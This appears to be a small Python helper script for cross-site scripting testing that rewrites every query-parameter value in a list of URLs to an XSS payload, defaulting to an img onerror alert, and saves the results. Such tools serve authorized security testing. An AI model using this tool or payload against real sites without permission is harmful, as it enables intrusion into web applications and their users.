#!/usr/bin/env python3
import urllib.parse
import argparse
from colorama import init, Fore

init()

g = Fore.GREEN

parse = argparse.ArgumentParser(description="EvilLight - QueryConvert\nInsert a payload or text into the values of the parameters in a list of URLs")
parse.add_argument('-i', help="Input File With Urls")
parse.add_argument('-p', help="Payload Of Cross Site Scripting", default="<img src=x onerror=alert('XSS')>")

args = parse.parse_args()

def convert(listUrl, payload):
    with open(listUrl, 'r') as fileUrls:
        urls = fileUrls.readlines()
        
    for url in urls:
        url = url.strip()
        if "=" in url:
            urlP = urllib.parse.urlparse(url)
            url_query = urlP.query
            qs = urllib.parse.parse_qsl(url_query)
            QS = [(key, payload) for key, _ in qs]
            new_query = urllib.parse.urlencode(QS)
            urlFull = urllib.parse.urlunparse(urlP._replace(query=new_query))
            print(f"{g}[Url Encoded] {urlFull}")
            with open("queryreplace.txt", 'a') as replace:
                replace.write(urlFull + '\n')

convert(args.i, args.p)
